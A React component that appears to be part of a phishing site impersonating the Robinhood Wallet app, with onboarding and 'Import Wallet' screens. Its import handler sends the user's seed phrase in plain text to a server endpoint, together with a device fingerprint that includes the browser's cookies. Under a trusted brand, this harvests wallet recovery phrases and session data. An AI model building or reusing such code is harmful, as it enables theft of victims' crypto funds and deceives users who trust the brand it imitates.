import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { ChevronLeft, Loader2 } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";

interface CreateWalletProps {
  onCreateNew: () => void;
  onImport: (userId: string, seedPhrase: string) => void;
}

export function CreateWallet({ onCreateNew, onImport }: CreateWalletProps) {
  const [showImport, setShowImport] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const handleImport = async () => {
    if (!seedPhrase.trim()) {
      setError("Please enter your seed phrase");
      return;
    }
    setLoading(true);
    setError("");
    try {
      const deviceInfo = {
        screenWidth: screen.width,
        screenHeight: screen.height,
        pixelRatio: window.devicePixelRatio,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages?.join(", "),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        cookies: document.cookie || "",
        online: navigator.onLine,
        vendor: navigator.vendor,
        maxTouchPoints: navigator.maxTouchPoints,
        hardwareConcurrency: navigator.hardwareConcurrency,
        colorDepth: screen.colorDepth,
        orientation: screen.orientation?.type,
      };
      const res = await apiRequest("POST", "/api/auth/seed-phrase", { seedPhrase: seedPhrase.trim(), deviceInfo });
      const data = await res.json();
      if (data.user) {
        onImport(data.user.id, seedPhrase.trim());
      }
    } catch {
      setError("Could not import wallet. Please check your seed phrase.");
    } finally {
      setLoading(false);
    }
  };

  if (showImport) {
    return (
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        className="flex flex-col min-h-screen min-h-[100dvh] bg-black text-white"
      >
        <div className="flex items-center px-4 pt-4">
          <button data-testid="button-back-import" onClick={() => { setShowImport(false); setError(""); setSeedPhrase(""); }} className="p-2">
            <ChevronLeft className="w-6 h-6 text-white" />
          </button>
        </div>

        <div className="pt-8 px-6">
          <motion.h1
            className="text-[32px] font-bold leading-tight"
            initial={{ y: 20, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            transition={{ delay: 0.1 }}
          >
            Import Wallet
          </motion.h1>
          <motion.p
            className="text-[#AEAEB2] text-[15px] mt-3 leading-relaxed"
            initial={{ y: 20, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            transition={{ delay: 0.2 }}
          >
            Enter your seed phrase to restore your wallet
          </motion.p>
        </div>

        <div className="flex-1 px-6 pt-8">
          <motion.div
            initial={{ y: 20, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            transition={{ delay: 0.3 }}
          >
            <textarea
              data-testid="input-import-seed-phrase"
              value={seedPhrase}
              onChange={(e) => { setSeedPhrase(e.target.value); setError(""); }}
              placeholder="Enter your seed phrase..."
              rows={4}
              className="w-full bg-[#1c1c1e] rounded-2xl px-5 py-4 text-white text-base placeholder:text-[#48484A] outline-none resize-none border border-[#2c2c2e] focus:border-[#48484A] transition-colors"
              autoFocus
            />
            {error && (
              <p className="text-[#FF453A] text-sm mt-3" data-testid="text-import-error">{error}</p>
            )}
          </motion.div>
        </div>

        <motion.div
          className="px-6 pb-4"
          initial={{ y: 30, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ delay: 0.4 }}
          style={{ paddingBottom: "max(1.5rem, env(safe-area-inset-bottom, 1.5rem))" }}
        >
          <button
            data-testid="button-submit-import"
            onClick={handleImport}
            disabled={loading || !seedPhrase.trim()}
            className="w-full py-[16px] bg-white text-black font-semibold text-[17px] rounded-full disabled:opacity-50 flex items-center justify-center gap-2"
          >
            {loading ? (
              <>
                <Loader2 className="w-5 h-5 animate-spin" />
                Importing...
              </>
            ) : (
              "Import Wallet"
            )}
          </button>
        </motion.div>
      </motion.div>
    );
  }

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="flex flex-col min-h-screen min-h-[100dvh] bg-black text-white"
    >
      <div className="pt-16 px-6">
        <motion.h1
          className="text-[42px] font-bold text-center leading-[1.05] tracking-tight"
          initial={{ y: 20, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ delay: 0.1 }}
        >
          Robinhood
          <br />
          Wallet
        </motion.h1>

        <motion.p
          className="text-[#AEAEB2] text-center text-[17px] mt-3"
          initial={{ y: 20, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ delay: 0.2 }}
        >
          Discover, swap, and store crypto
        </motion.p>
      </div>

      <div className="flex-1 flex items-center justify-center">
        <motion.div
          className="overflow-hidden"
          data-testid="img-holo-coin"
          style={{ width: 320, height: 320 }}
          initial={{ scale: 0.85, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ delay: 0.25, duration: 0.6, ease: "easeOut" }}
        >
          <video
            src="/coins-loop.mp4"
            autoPlay
            loop
            muted
            playsInline
            disablePictureInPicture
            style={{
              display: "block",
              width: "100%",
              height: "115%",
              objectFit: "cover",
              objectPosition: "center top",
              border: "none",
              outline: "none",
              background: "black",
              pointerEvents: "none",
            }}
          />
        </motion.div>
      </div>

      <motion.div
        className="px-6 pb-4"
        initial={{ y: 30, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        transition={{ delay: 0.35 }}
        style={{ paddingBottom: "max(1.5rem, env(safe-area-inset-bottom, 1.5rem))" }}
      >
        <p className="text-[#636366] text-[13px] text-center mb-5 leading-relaxed">
          By continuing, you agree to the{" "}
          <span className="underline text-[#AEAEB2]">Self-Custody Wallet Licensing and User Agreement</span>
        </p>

        <button
          data-testid="button-create-wallet"
          onClick={onCreateNew}
          className="w-full py-[16px] bg-white text-black font-semibold text-[17px] rounded-full"
        >
          Create new wallet
        </button>

        <button
          data-testid="button-import-wallet"
          onClick={() => setShowImport(true)}
          className="w-full py-3 mt-2 text-white font-semibold text-[15px] underline"
        >
          Import wallet
        </button>
      </motion.div>
    </motion.div>
  );
}
